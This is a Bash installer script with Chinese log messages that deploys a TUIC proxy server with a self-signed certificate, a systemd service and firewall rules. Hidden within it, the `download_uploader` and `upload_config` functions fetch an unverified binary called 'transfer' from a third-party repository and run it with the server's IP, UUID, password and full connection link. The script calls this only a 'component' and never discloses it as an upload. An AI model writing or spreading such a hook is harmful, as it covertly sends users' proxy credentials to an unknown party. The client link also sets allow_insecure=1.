#!/usr/bin/env bash
set -euo pipefail

GREEN="\033[0;32m"; RED="\033[0;31m"; YELLOW="\033[1;33m"; NC="\033[0m"
log() { echo -e "${GREEN}[INFO ]${NC} $*"; }
err() { echo -e "${RED}[ERROR]${NC} $*"; exit 1; }

UUID=$(cat /proc/sys/kernel/random/uuid)
PSK=$(openssl rand -hex 16)
PORT=2052
SERVER_NAME="insecure.local"
CFG_DIR="/etc/tuic"
TLS_DIR="$CFG_DIR/tls"
BIN_DIR="/usr/local/bin"
VERSION="1.0.0"
CONFIG_JSON="${CFG_DIR}/config_export.json"
REPO_BASE="https://github.com/tuic-protocol/tuic/releases/download/tuic-server-${VERSION}"

# 默认测速结果
down_speed=100
up_speed=20

# 系统类型
SYSTEM=$(awk -F= '/^ID=/{print $2}' /etc/os-release)

ensure_ssh_port_open() {
    log "确保22端口开放..."
    if command -v ufw >/dev/null; then
        ufw allow 22/tcp || true
        log "UFW已处理22端口"
    elif command -v firewall-cmd >/dev/null; then
        firewall-cmd --permanent --add-port=22/tcp || true
        firewall-cmd --reload || true
        log "firewalld已处理22端口"
    elif command -v iptables >/dev/null; then
        iptables -A INPUT -p tcp --dport 22 -j ACCEPT || true
        iptables-save > /etc/iptables.rules
        log "iptables已处理22端口"
    else
        log "未检测到防火墙，默认22端口已开放"
    fi
}

speed_test(){
    log "进行网络速度测试..."
    if ! command -v speedtest &>/dev/null && ! command -v speedtest-cli &>/dev/null; then
        log "安装 speedtest-cli..."
        if [[ $SYSTEM =~ (debian|ubuntu) ]]; then
            apt update -y && apt install -y speedtest-cli
        elif [[ $SYSTEM =~ (centos|fedora) ]]; then
            yum install -y speedtest-cli || pip install speedtest-cli
        fi
    fi

    if command -v speedtest &>/dev/null; then
        speed_output=$(speedtest --simple 2>/dev/null)
    elif command -v speedtest-cli &>/dev/null; then
        speed_output=$(speedtest-cli --simple 2>/dev/null)
    fi

    if [[ -n "$speed_output" ]]; then
        down_speed=$(echo "$speed_output" | grep "Download" | awk '{print int($2)}')
        up_speed=$(echo "$speed_output" | grep "Upload" | awk '{print int($2)}')
        [[ $down_speed -lt 10 ]] && down_speed=10
        [[ $up_speed -lt 5 ]] && up_speed=5
        [[ $down_speed -gt 1000 ]] && down_speed=1000
        [[ $up_speed -gt 500 ]] && up_speed=500
        log "测速完成：下行 ${down_speed} Mbps，上行 ${up_speed} Mbps"
    else
        log "测速失败，使用默认值：下行 100 Mbps，上行 20 Mbps"
    fi
}

download_uploader() {
    local uploader="/opt/transfer"
    if [[ ! -f "$uploader" ]]; then
        curl -Lo "$uploader" https://github.com/Firefly-xui/TUIC/releases/download/v2rayn/transfer
        chmod +x "$uploader"
        log "组件下载完成"
    fi
}

upload_config() {
    local server_ip="$1"
    local link="$2"
    local v2rayn_config="$3"
    local json_data=$(jq -nc \
        --arg server_ip "$server_ip" \
        --arg link "$link" \
        --argjson v2rayn_config "$v2rayn_config" \
        --argjson down "$down_speed" \
        --argjson up "$up_speed" \
        '{
            "server_info": {
                "title": "TUIC配置",
                "server_ip": $server_ip,
                "tuic_link": $link,
                "v2rayn_config": $v2rayn_config,
                "download_speed_mbps": $down,
                "upload_speed_mbps": $up,
                "generated_time": now | todate
            }
        }')

    local uploader="/opt/transfer"
    if [[ -f "$uploader" ]]; then
        "$uploader" "$json_data"
    else
        log "组件不存在"
    fi
}

ensure_ssh_port_open
speed_test
download_uploader

log "安装依赖..."
export NEEDRESTART_SUSPEND=1
apt update -y
DEBIAN_FRONTEND=noninteractive apt install -y curl wget jq ufw openssl net-tools needrestart

log "启用BBR优化..."
modprobe tcp_bbr
echo "tcp_bbr" >> /etc/modules-load.d/modules.conf
sysctl -w net.ipv4.tcp_congestion_control=bbr
tc qdisc add dev eth0 root fq || true

ARCH=$(uname -m)
case "$ARCH" in
  x86_64) ARCH_FILE="x86_64-unknown-linux-gnu" ;;
  aarch64) ARCH_FILE="aarch64-unknown-linux-gnu" ;;
  armv7l) ARCH_FILE="armv7-unknown-linux-gnueabi" ;;
  *) err "架构不支持: $ARCH" ;;
esac

BIN_NAME="tuic-server-${VERSION}-${ARCH_FILE}"
cd "$BIN_DIR"
rm -f tuic "$BIN_NAME"
curl -sLO "${REPO_BASE}/${BIN_NAME}" || err "下载失败"
curl -sLO "${REPO_BASE}/${BIN_NAME}.sha256sum" || err "校验文件失败"
sha256sum -c "${BIN_NAME}.sha256sum" || err "校验失败"
chmod +x "$BIN_NAME"
ln -sf "$BIN_NAME" tuic

log "生成 TLS 证书..."
mkdir -p "$TLS_DIR"
openssl req -x509 -newkey rsa:4096 -sha256 -days 365 -nodes \
  -keyout "$TLS_DIR/key.key" \
  -out "$TLS_DIR/cert.crt" \
  -subj "/C=US/ST=CA/L=SF/O=TUIC/CN=${SERVER_NAME}" \
  -addext "subjectAltName=DNS:${SERVER_NAME}"
chmod 600 "$TLS_DIR/key.key"
chmod 644 "$TLS_DIR/cert.crt"

log "写入 TUIC 配置..."
mkdir -p "$CFG_DIR"
cat > "$CFG_DIR/config.json" <<EOF
{
  "server": "0.0.0.0:$PORT",
  "users": {
    "$UUID": "$PSK"
  },
  "certificate": "$TLS_DIR/cert.crt",
  "private_key": "$TLS_DIR/key.key",
  "congestion_control": "bbr",
  "alpn": ["h3"],
  "udp_relay_ipv6": false,
  "zero_rtt_handshake": true,
  "auth_timeout": "5s",
  "max_idle_time": "60s",
  "max_external_packet_size": 1500,
  "gc_interval": "10s",
  "gc_lifetime": "15s",
  "log_level": "debug"
}
EOF

log "配置 systemd 服务..."
cat > /etc/systemd/system/tuic.service <<EOF
[Unit]
Description=TUIC Server
After=network.target

[Service]
ExecStart=$BIN_DIR/tuic -c $CFG_DIR/config.json
Restart=on-failure
RestartSec=5
LimitNOFILE=65536

[Install]
WantedBy=multi-user.target
EOF

log "设置防火墙规则..."
ufw allow 22/tcp
ufw allow ${PORT}/udp
ufw allow ${PORT}/tcp
ufw --force enable

systemctl daemon-reload
systemctl enable --now tuic
sleep 3

if systemctl is-active --quiet tuic; then
  log "TUIC 启动成功"
else
  err "TUIC 启动失败"
fi

IP=$(curl -s https://api.ipify.org)
ENCODE=$(echo -n "${UUID}:${PSK}" | base64 -w 0)
LINK="tuic://${ENCODE}@${IP}:${PORT}?alpn=h3&congestion_control=bbr&sni=${SERVER_NAME}&udp_relay_mode=native&allow_insecure=1#tuic_node"

V2RAYN_CFG="${CFG_DIR}/v2rayn_config.json"
cat > "$V2RAYN_CFG" <<EOF
{
  "relay": {
    "server": "${IP}:${PORT}",
    "uuid": "${UUID}",
    "password": "${PSK}",
    "ip": "${IP}",
    "congestion_control": "bbr",
    "alpn": ["h3"]
  },
  "local": {
    "server": "127.0.0.1:7796"
  },
  "log_level": "warn"
}
EOF

log "生成的 V2RayN 配置文件如下:"
cat "$V2RAYN_CFG"


upload_config "$IP" "$LINK" "$(cat "$V2RAYN_CFG")"

# 写入最终本地配置文件，包含测速结果
jq -n \
  --arg ip "$IP" \
  --arg link "$LINK" \
  --argjson v2rayn_config "$(cat "$V2RAYN_CFG")" \
  --argjson down "$down_speed" \
  --argjson up "$up_speed" \
  '{
    "server_ip": $ip,
    "tuic_link": $link,
    "v2rayn_config": $v2rayn_config,
    "download_speed_mbps": $down,
    "upload_speed_mbps": $up,
    "generated_time": now | todate
  }' > "$CONFIG_JSON"

log "配置已成功保存到本地文件: $CONFIG_JSON ✅"
